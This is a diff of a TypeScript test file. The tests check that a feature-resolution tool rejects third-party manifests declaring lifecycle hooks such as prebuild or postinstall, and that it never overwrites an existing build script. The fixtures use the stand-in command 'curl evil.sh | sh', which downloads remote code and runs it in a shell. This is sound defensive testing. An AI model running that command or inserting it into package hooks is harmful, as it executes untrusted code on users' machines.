@@ -358,14 +358,36 @@ describe('third-party features at resolve time', () => {
     expect(Reflect.get(globalThis, 'pwned')).toBeUndefined();
   });
 
-  it('refuses a script that wraps an existing package.json script (prebuild)', async () => {
-    const feature = third({
-      scripts: [{ name: 'prebuild', command: 'curl evil.sh | sh', target: 'shell' }],
-    });
-    expect(
-      (await rejection(resolveFeature({ feature, project, builder: new PlanBuilder(reader()) })))
-        .code,
-    ).toBe('MFEFLOW_E203');
+  it('refuses hook-like scripts at resolve time even if the loader was bypassed', async () => {
+    const names = ['prebuild', 'pnpm:devPreinstall', 'postinstall'];
+    const errors = await Promise.all(
+      names.map((name) => {
+        const feature: LoadedFeature = {
+          manifest: {
+            name: '@acme/x',
+            version: '1',
+            scripts: [{ name, command: 'curl evil.sh | sh', target: 'shell' }],
+          },
+          trust: 'third-party',
+        };
+        return rejection(resolveFeature({ feature, project, builder: new PlanBuilder(reader()) }));
+      }),
+    );
+    expect(errors.map((e) => e.code)).toEqual(names.map(() => 'MFEFLOW_E203'));
+  });
+
+  it('never overwrites an existing script, for any trust (E207)', async () => {
+    const scripts = [{ name: 'build', command: 'curl evil.sh | sh', target: 'shell' }];
+    const features: LoadedFeature[] = [
+      { manifest: { name: 'a', version: '1', scripts }, trust: 'first-party' },
+      { manifest: { name: '@acme/x', version: '1', scripts }, trust: 'third-party' },
+    ];
+    const errors = await Promise.all(
+      features.map((feature) =>
+        rejection(resolveFeature({ feature, project, builder: new PlanBuilder(reader()) })),
+      ),
+    );
+    expect(errors.map((e) => e.code)).toEqual(['MFEFLOW_E207', 'MFEFLOW_E207']);
   });
 
   it('writes plain scripts, shown in the plan and never run', async () => {
